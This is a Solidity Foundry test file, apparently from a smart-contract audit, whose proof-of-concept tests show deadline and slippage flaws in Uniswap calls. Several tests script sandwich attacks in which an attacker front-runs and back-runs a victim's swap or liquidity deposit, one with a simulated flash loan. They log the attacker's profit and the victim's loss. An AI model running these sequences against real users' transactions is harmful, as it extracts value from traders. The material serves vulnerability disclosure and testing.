// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.19 <0.9.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {VaultShares} from "../../src/protocol/VaultShares.sol";

import {Fork_Test} from "./Fork.t.sol";
import {console2} from "forge-std/console2.sol";

import {UniswapRouterMock} from "../mocks/UniswapRouterMock.sol";

contract WethForkTest is Fork_Test {
    address public guardian = makeAddr("guardian");
    address public user = makeAddr("user");
    address public atacker = makeAddr("atacker");

    VaultShares public wethVaultShares;

    UniswapRouterMock public uniswapR;

    uint256 guardianAndDaoCut;
    uint256 stakePrice;
    uint256 mintAmount = 100 ether;

    // 500 hold, 250 uniswap, 250 aave
    // @audit-info - Consider initialice structs with named fields
    // @audit-info - `AllocationData({ holdAllocation: 500, uniswapAllocation: 250, aaveAllocation: 250 })`
    AllocationData allocationData = AllocationData(500, 250, 250);
    // @audit-info - Consider initialice structs with named fields
    // @audit-info - `AllocationData({ holdAllocation: 500, uniswapAllocation: 250, aaveAllocation: 250 })`
    AllocationData newAllocationData = AllocationData(0, 500, 500);

    function setUp() public virtual override {
        Fork_Test.setUp();
        uniswapR = UniswapRouterMock(uniswapRouter);
    }

    modifier hasGuardian() {
        deal(address(weth), guardian, mintAmount);
        vm.startPrank(guardian);
        weth.approve(address(vaultGuardians), mintAmount);
        address wethVault = vaultGuardians.becomeGuardian(allocationData);
        wethVaultShares = VaultShares(wethVault);
        vm.stopPrank();
        _;
    }

    function testDepositAndWithdraw() public {}

    /**
     * @notice PoC: General Front-Running/Deadline vulnerability demonstration.
     * Shows how `block.timestamp` as a deadline fails to protect against delayed execution, 
     * while a fixed deadline successfully ensures transaction expiry.
     */
    function testFrontRunningWithExactDeadLine() public {

        address[] memory path1 = new address[](2);
        path1[0] = address(weth);
        path1[1] = address(usdc);

        deal(address(weth), user, 500e18);
        deal(address(weth), atacker, 2000e18);
        vm.startPrank(user);
        weth.approve(address(uniswapR), type(uint256).max);

        /////////////////////////////////////////////
        //          Using block.timestamp          //
        /////////////////////////////////////////////

        // User signs and sends transaction now
        uint256 timeOfIntent = block.timestamp;
        console2.log("Transaction sent at timestamp:  ", timeOfIntent);

        // Simulate network congestion or malicious validator waiting 1 day
        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 7200);

        // Transaction is finally executed here
        console2.log("Transaction finally mined at:       ", block.timestamp);

        // Using block.timestamp means the transaction never expires because "now" is always valid.
        // This is dangerous if the network takes too long.
        uniswapR.swapExactTokensForTokens(
            weth.balanceOf(user),
            0,
            path1,
            user,
            block.timestamp);

        console2.log("User WETH Balance: ", weth.balanceOf(user));
        console2.log("User USDC Balance: ", usdc.balanceOf(user));
        console2.log("Transaction succeed after 24 hours.");
        console2.log("Conclusion: Deadline did not protect the user.");

        /////////////////////////////////////////////
        //          Using a fixed deadline         //
        /////////////////////////////////////////////
        
        // User tries again, but sets a real time limit (e.g. 1 hour)
        uint256 newTimeOfIntent = block.timestamp;
        console2.log("New transaction sent at:            ", newTimeOfIntent);

        // Again, simulate 1 day delay
        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 7200);

        console2.log("Attempted mining at timestamp:      ", block.timestamp);

        // Here transaction fails because more than 1 hour passed.
        // This protects the user from bad prices or old trades.

        uint256 userBalance = weth.balanceOf(user);
        
        vm.expectRevert("UniswapV2Router: EXPIRED");
        
        uniswapR.swapExactTokensForTokens(
            userBalance,
            0,
            path1,
            user,
            newTimeOfIntent + 1 hours); // Fixed deadline: 1 hour from sending

        vm.stopPrank();

    }

    /**
     * @notice PoC: General Sandwich Attack demonstration (Swap).
     * Shows how setting `amountOutMin: 0` during a swap allows an attacker to front-run (pump price) 
     * and back-run (dump price), extracting value from the victim's trade.
     * This attack can be done using a flash loan to front-run the user's deposit.
     */
    function testFrontRunningWithAmountOutMinZero() public {
        address[] memory path1 = new address[](2);
        path1[0] = address(weth);
        path1[1] = address(usdc);

        address[] memory path2 = new address[](2);
        path2[0] = address(usdc);
        path2[1] = address(weth);

        deal(address(weth), user, 500e18);
        deal(address(weth), atacker, 2000e18);

        uint256 attackerWethBalanceBefore = weth.balanceOf(atacker);

        // Attacker jumps ahead (Front-run)
        // Sells WETH and buys USDC to push USDC price up.
        vm.startPrank(atacker);
        weth.approve(address(uniswapR), type(uint256).max);
        uniswapR.swapExactTokensForTokens(
            weth.balanceOf(atacker),
            0,
            path1,
            atacker,
            block.timestamp);
        vm.stopPrank();

        // User executes swap (Victim)
        // Sells WETH for USDC. Since amountOutMin is 0, they accept ANY amount of USDC.
        // Receives LESS USDC than normal because price is inflated by attacker.
        vm.startPrank(user);
        weth.approve(address(uniswapR), type(uint256).max);
        uniswapR.swapExactTokensForTokens(
            weth.balanceOf(user),
            0, // BIG MISTAKE: Accepting 0 means "give me whatever", ideal for sandwich attacks.
            path1,
            user,
            block.timestamp);
        vm.stopPrank();

        // Attacker sells (Back-run)
        // Sells their USDC (now more expensive) for WETH and takes profits.
        vm.startPrank(atacker);
        usdc.approve(address(uniswapR), type(uint256).max);
        uniswapR.swapExactTokensForTokens(
            usdc.balanceOf(atacker),
            0,
            path2,
            atacker,
            block.timestamp);
        vm.stopPrank();

        uint256 attackerWethBalanceAfter = weth.balanceOf(atacker);

        console2.log("Attacker Profit (in WETH): ", attackerWethBalanceAfter - attackerWethBalanceBefore);
    }

    /**
     * @notice PoC: Lack of Deadline Protection.
     * Demonstrates that passing `block.timestamp` as the deadline to Uniswap functions offers no protection 
     * against transaction withholding. A transaction can be held for days and still execute successfully.
     */
    function testRebalanceFundsDeadlineNoProtection() public {
        // Setup: User with tokens
        deal(address(weth), user, 500e18);
        deal(address(usdc), user, 500e18); // Need pair token for liquidity
        
        vm.startPrank(user);
        weth.approve(address(uniswapR), type(uint256).max);
        usdc.approve(address(uniswapR), type(uint256).max);

        /////////////////////////////////////////////
        //           Using block.timestamp         //
        /////////////////////////////////////////////

        uint256 timeOfIntent = block.timestamp;
        console2.log("Transaction sent at timestamp:  ", timeOfIntent);

        // Simulate massive delay (validator withholding tx)
        vm.warp(block.timestamp + 10 days);
        vm.roll(block.number + 72000);

        console2.log("Transaction finally mined at:       ", block.timestamp);

        // This represents the vulnerable call inside UniswapAdapter.sol
        // passing 'block.timestamp' as deadline.
        uniswapR.addLiquidity(
            address(weth),
            address(usdc),
            10e18,
            10e18,
            0,
            0,
            user,
            block.timestamp // <--- The Vulnerability: "Now" is always valid
        );

        console2.log("Liquidity added successfully after 10 days.");
        console2.log("Conclusion: block.timestamp offers no protection.");

        /////////////////////////////////////////////
        //          Using a fixed deadline         //
        /////////////////////////////////////////////

        // User signs transaction with a explicit deadline (e.g. 1 hour)
        uint256 newTimeOfIntent = block.timestamp;
        console2.log("New transaction sent at:            ", newTimeOfIntent);

        // Simulate delay again (10 days)
        vm.warp(block.timestamp + 10 days);
        vm.roll(block.number + 72000);

        console2.log("Attempted execution at:             ", block.timestamp);

        // Transaction fails because deadline expired
        vm.expectRevert("UniswapV2Router: EXPIRED");

        uniswapR.addLiquidity(
            address(weth),
            address(usdc),
            10e18,
            10e18,
            0,
            0,
            user,
            newTimeOfIntent + 1 hours // <--- Fixed deadline protects usage
        );

        console2.log("Transaction reverted as expected with fixed deadline.");

        vm.stopPrank();
    }

    /**
     * @notice PoC: Lack of Slippage Protection (Sandwich Attack).
     * Demonstrates that hardcoding `amountAMin` and `amountBMin` to 0 allows front-runners to manipulate 
     * the pool price, causing the user to deposit assets at an extremely unfavorable rate and suffer immediate loss.
     * This attack can be done using a flash loan to front-run the user's deposit.
     */
    function testAddLiquidityNoSlippageProtection() public {
        uint256 userWethAmount = 10e18;
        uint256 userUsdcAmount = 20_000e6;
        
        // Setup balances
        deal(address(weth), user, userWethAmount);
        deal(address(usdc), user, userUsdcAmount);
        // Simulate Flash Loan: Attacker borrows huge amount of WETH
        deal(address(weth), atacker, 100_000e18); 

        vm.startPrank(atacker);
        weth.approve(address(uniswapR), type(uint256).max);
        usdc.approve(address(uniswapR), type(uint256).max);
        vm.stopPrank();
        
        // Setup User Approvals
        vm.startPrank(user);
        weth.approve(address(uniswapR), type(uint256).max);
        usdc.approve(address(uniswapR), type(uint256).max);
        vm.stopPrank();

        // Capture initial state
        uint256 userWethStart = weth.balanceOf(user);
        uint256 userUsdcStart = usdc.balanceOf(user);
        
        // Get initial price roughly to normalize value to ETH
        // Hardcoded price for PoC simplicity: 1500 USDC per ETH
        uint256 priceEthInUsdc = 1500e6; 
        
        // Calculate Initial User Wealth in ETH
        // Wealth = WETH + (USDC converted to ETH)
        // 1 ETH = 1500 USDC => 1 USDC = 1/1500 ETH
        // Value in ETH = USDC_Amount * 1e18 / (1500 * 1e6)
        uint256 userWealthStartEth = userWethStart + (userUsdcStart * 1e18 / priceEthInUsdc);
        
        console2.log("User Start WETH:               ", userWethStart);
        console2.log("User Start USDC:               ", userUsdcStart);
        console2.log("Initial Wealth (in ETH):       ", userWealthStartEth);

        // ATTACK (Flash Loan Manipulation)
        vm.prank(atacker);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);
        uniswapR.swapExactTokensForTokens(
            50_000e18, // Sells 50,000 ETH to crash price significantly
            0, 
            path, 
            atacker, 
            block.timestamp
        );

        // VICTIM DEPOSIT (Bad Rate)
        vm.prank(user);
        uniswapR.addLiquidity(
            address(weth),
            address(usdc),
            userWethAmount,
            userUsdcAmount,
            0, // No slippage protection
            0, 
            user,
            block.timestamp
        );

        // BACK-RUN (Attacker swap back to restore price / Flash Loan repayment)
        vm.startPrank(atacker);
        uint256 attackerUsdcBalance = usdc.balanceOf(atacker);
        usdc.approve(address(uniswapR), type(uint256).max);
        
        address[] memory pathBack = new address[](2);
        pathBack[0] = address(usdc);
        pathBack[1] = address(weth);
        
        uniswapR.swapExactTokensForTokens(
            attackerUsdcBalance, 
            0, 
            pathBack, 
            atacker, 
            block.timestamp
        );
        vm.stopPrank();
        console2.log("Attacker closed position (Price restored).");

        // VICTIM EXIT (Unwind position)
        // Mainnet WETH-USDC Uniswap V2 Pair Address
        IERC20 lpToken = IERC20(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
        uint256 userLpBalance = lpToken.balanceOf(user);
        
        vm.startPrank(user);
        lpToken.approve(address(uniswapR), userLpBalance);
        uniswapR.removeLiquidity(
            address(weth),
            address(usdc),
            userLpBalance,
            0,
            0,
            user,
            block.timestamp
        );
        vm.stopPrank();

        // CALCULATION OF TOTAL NET LOSS
        uint256 userWethFinal = weth.balanceOf(user);
        uint256 userUsdcFinal = usdc.balanceOf(user);
        
        // Calculate Final User Wealth in ETH using ORIGINAL price (fair value comparison)
        uint256 userWealthFinalEth = userWethFinal + (userUsdcFinal * 1e18 / priceEthInUsdc);
        
        console2.log("User Final WETH:               ", userWethFinal);
        console2.log("User Final USDC:               ", userUsdcFinal);
        console2.log("Final Wealth (in ETH):         ", userWealthFinalEth);

        if (userWealthFinalEth < userWealthStartEth) {
            uint256 netLossEth = userWealthStartEth - userWealthFinalEth;
            uint256 lossPercentage = (netLossEth * 100) / userWealthStartEth;
            
             console2.log("NET TOTAL LOSS (ETH value):    ", netLossEth);
             console2.log("Total Loss Percentage:         ", lossPercentage, "%");
             
             assert(lossPercentage > 20); 
             console2.log("Conclusion: Significant loss of user wealth.");
        }
    }
}